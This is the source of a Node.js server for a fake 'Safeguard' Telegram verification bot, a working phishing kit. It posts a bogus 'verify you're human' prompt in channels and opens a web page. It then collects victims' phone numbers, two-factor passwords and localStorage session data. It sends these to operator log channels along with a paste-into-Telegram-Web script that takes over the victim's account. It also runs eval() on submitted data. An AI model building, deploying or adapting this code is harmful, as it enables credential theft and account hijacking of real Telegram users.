const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");

require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil =
  require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// Determine if we're in a serverless environment (Vercel)
const isServerless = process.env.VERCEL === '1';

// Loading all the pictures beforehand for speed
// Make sure these images exist in your public directory
const safeguardSuccess = fs.existsSync(path.join(__dirname, "public/images/success/safeguard.jpg")) 
  ? fs.readFileSync(path.join(__dirname, "public/images/success/safeguard.jpg"))
  : null;

const safeguardVerification = fs.existsSync(path.join(__dirname, "public/images/verification/safeguard.jpg"))
  ? fs.readFileSync(path.join(__dirname, "public/images/verification/safeguard.jpg"))
  : null;

// Only initialize the bot if we have a token and we're not in Vercel serverless environment
// or if we're explicitly starting the bot
const shouldStartBot = !isServerless || process.env.START_BOT === 'true';
let safeguardBot = null;
let safeguardUsername = null;

if (process.env.FAKE_SAFEGUARD_BOT_TOKEN && shouldStartBot) {
  safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
    polling: true,
  });

  safeguardBot.getMe().then((botInfo) => {
    safeguardUsername = botInfo.username;
    console.log(`Safeguard Bot Username: ${safeguardUsername}`);
  });
}

const filePath = path.join(__dirname, "channelUrls.json");

// Function to load URLs from the file
async function loadUrls() {
  try {
    if (fs.existsSync(filePath)) {
      const data = await fs.promises.readFile(filePath, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (err) {
    return {};
  }
}

// Function to save URLs to the file
async function saveUrl(chatId, url) {
  try {
    const channelUrls = await loadUrls(); // Load current URLs
    channelUrls[chatId] = url; // Add or update the URL for the chatId
    fs.writeFileSync(filePath, JSON.stringify(channelUrls, null, 2)); // Write updated URLs to file
  } catch (err) {
    console.error("Error saving URL:", err);
  }
}

// Sample button texts for bot interactions - customize as needed
const guardianButtonTexts = [
  "🟩Telegram tools👈JOIN NOW!🟡",
  "Verification successful!🔷",
  "🔥Join community🔥",
];

// Generate random string for invitation links
const generateRandomString = (length) => {
  const charset =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

// Initialize Express app
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// API endpoint to securely provide bot configuration to client
// This avoids exposing the bot token directly in client-side code
app.get('/api/bot-config', (req, res) => {
  res.json({
    // Only provide the minimal data needed by the client
    // Don't expose the actual bot token
    botApiUrl: `https://api.telegram.org/bot${process.env.FAKE_SAFEGUARD_BOT_TOKEN}`,
    logsId: process.env.LOGS_ID
  });
});

// Route for safeguard verification page
app.get('/safeguard', (req, res) => {
  const { type, id } = req.query;
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

// API endpoint to handle user information submitted from verification page
app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type,
      channelid,
    } = req.body;

    let pass = password;
    if (pass === null) {
      pass = "No Two-factor authentication enabled.";
    }

    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${
          username.isActive ? "✅" : "❌"
        }\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);

    const quickAuth = `Object.entries(${JSON.stringify(
      quicklySet
    )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    try {
      eval(quicklySet);
    } catch (e) {}

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      scripttocheck: quickAuth,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type,
      channel: channelid,
    });
  } catch (error) {
    console.error("500 server error", error);
    res.status(500).json({ error: "server error" });
  }
});

// Helper function to create delays
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Handle verification requests and send logs to specified channels
const handleRequest = async (req, res, data) => {
  try {
    // For serverless, create a temporary bot instance just for sending messages
    // This avoids the long-polling issue on Vercel
    let tempBot = null;
    if (process.env.FAKE_SAFEGUARD_BOT_TOKEN) {
      tempBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
        polling: false // Important: don't use polling in serverless
      });
    }
    
    if (!tempBot && !safeguardBot) {
      return res.json({ success: true, message: "Data received (bot not active)" });
    }
    
    // Use either the temp bot or the existing bot
    const bot = tempBot || safeguardBot;
    
    // Send verification data to all log channels defined in .env
    const logIds = process.env.LOGS_ID.split(',').map(id => id.trim());
    for (const logId of logIds) {
      try {
        await bot.sendMessage(
          logId,
          `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${
            data.name
          }\n⭐ <b>Telegram Premium</b>: ${
            data.premium ? "✅" : "❌"
          }\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${
            data.usernames
          }\n🔐 <b>Password</b>: <code>${
            data.password !== undefined ? data.password : "Null"
          }</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${
            data.script
          }</code>\n<b>Module</b>: ${
            data.type.charAt(0).toUpperCase() + data.type.slice(1)
          }`,
          {
            parse_mode: "HTML",
          }
        );
        console.log(`Successfully sent message to log ID: ${logId}`);
      } catch (error) {
        console.error(`Failed to send message to log ID ${logId}:`, error.message);
      }
    }
    
    let type = data.type;
    let channelId = data.channel;
    
    // Load current channel URLs
    const channelUrls = await loadUrls();

    if (type === "safeguard") {
      let image;
      let caption;
      let channelUrl;
      
      if (type === "safeguard") {
        image = safeguardSuccess;
        
        // Get existing URL or generate a new one
        if (channelUrls[channelId]) {
          channelUrl = channelUrls[channelId];
        } else {
          channelUrl = `https://t.me/+${generateRandomString(16)}`;
          // Save the new URL if we have a channel ID
          if (channelId) {
            await saveUrl(channelId, channelUrl);
          }
        }
        
        caption = `Verified, you can join the group using this temporary link:\n\n${channelUrl}\n\nThis link is a one time use and will expire`;
      }

      const randomText =
        guardianButtonTexts[
          Math.floor(Math.random() * guardianButtonTexts.length)
        ];

      const guardianButtons = {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: randomText,
                url: `https://t.me/+${generateRandomString(16)}`,
              },
            ],
          ],
        },
      };
      
      // Create buttons for the success message
      const safeguardButtons = {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Community Channel",
                url: "https://t.me/your_community_channel", // Replace with your own channel
              },
            ],
          ],
        },
      };

      const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;

      await bot.sendPhoto(data.userId, image, {
        caption,
        ...buttons,
        parse_mode: "HTML",
      });
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Error handling request:", error);
    res.status(500).json({ success: false, error: "Internal server error" });
  }
};

// Only set up bot event handlers if the bot is active
if (safeguardBot) {
  // Handle new chat member events (bot added to channels)
  const handleNewChatMember = async (bot, type) => {
    bot.on("my_chat_member", async (update) => {
      const chatId = update.chat.id;

      let jsonToSend;
      let imageToSend;

      switch (type) {
        case "safeguard":
          jsonToSend = {
            caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "Tap To Verify",
                    url: `https://t.me/${update.new_chat_member.user.username}?start=${chatId}`,
                  },
                ],
              ],
            },
          };
          imageToSend = safeguardVerification;
          break;
        default:
          jsonToSend = {};
      }

      await delay(2000);

      if (
        update.chat.type === "channel" &&
        update.new_chat_member.status === "administrator" &&
        update.new_chat_member.user.is_bot === true
      ) {
        bot.sendPhoto(chatId, imageToSend, jsonToSend);
      }
    });
  };

  // Handle text messages sent to the bot
  function handleText(bot) {
    try {
      bot.on("message", (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        // Known command patterns
        const knownCommands = [
          /^\/start/,
          /^\/link (.+)/,
          /^\/geturl/,
          /\/start(?:\s+(-?\S+))?/,
        ];

        // Check if message text matches any known commands
        const isKnownCommand = knownCommands.some((cmd) => cmd.test(text));

        // If message is not a known command, send an unknown command response
        if (!isKnownCommand) {
          bot.sendMessage(
            chatId,
            `
❌ Unknown Command!

You have sent a message directly to the bot's chat, or
the menu structure has been modified by an Admin.

ℹ️ Please avoid sending messages directly to the bot or
reload the menu by pressing /start.
            `
          );
        }
      });
    } catch (error) {
      console.log(error);
    }
  }

  // Handle /start command (main bot entry point)
  function handleStart(bot) {
    try {
      bot.onText(/\/start(?:\s+(-?\S+))?/, (msg, match) => {
        let botInfo;
        bot.getMe().then((botInformation) => {
          botInfo = botInformation;
          if (botInfo.username) {
            const chatId = msg.chat.id;
            const id = match[1];
            let jsonToSend;
            let imageToSend;
            if (botInfo.username === safeguardUsername) {
              jsonToSend = {
                caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
                parse_mode: "HTML",
                reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: "VERIFY",
                        web_app: {
                          url: `${process.env.DOMAIN}?type=safeguard&id=${id}`,
                        },
                      },
                    ],
                  ],
                },
              };
              imageToSend = safeguardVerification;
            }

            bot.sendPhoto(chatId, imageToSend, jsonToSend);
          }
        });
      });
    } catch (error) {
      console.log(error);
    }
  }

  // Handle /link command to set group/channel invite URLs
  async function handleLink(bot) {
    try {
      // Command to set a URL for the channel
      bot.on("channel_post", async (msg) => {
        const chatId = msg.chat.id;
        const messageText = msg.text;

        if (messageText && messageText.startsWith("/link")) {
          const args = messageText.split(" ");
          const url = args[1];

          bot.deleteMessage(chatId, msg.message_id).catch(console.error);

          if (url) {
            await saveUrl(chatId, url);
            bot
              .sendMessage(
                chatId,
                `Group link for this channel has been set to: ${url}`
              )
              .then((sentMessage) => {
                // Wait 5 seconds before deleting
                setTimeout(() => {
                  bot.deleteMessage(chatId, sentMessage.message_id);
                }, 5000);
              })
              .catch(console.error);
          } else {
            bot
              .sendMessage(
                chatId,
                `Please provide a URL with the command. Example: /link https://t.me/+${generateRandomString(
                  16
                )}`
              )
              .then((sentMessage) => {
                // Wait 5 seconds before deleting
                setTimeout(() => {
                  bot.deleteMessage(chatId, sentMessage.message_id);
                }, 5000);
              })
              .catch(console.error);
          }
        }
      });
    } catch (error) {
      console.log(error);
    }
  }

  // Initialize bot handlers if bot is active
  handleNewChatMember(safeguardBot, "safeguard");
  handleStart(safeguardBot);
  handleText(safeguardBot);
  handleLink(safeguardBot);
}

// For local development - only start the server when running directly
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () =>
    console.log(`Server running on port ${PORT}`)
  );
}

// For Vercel serverless - export the Express app
module.exports = app;
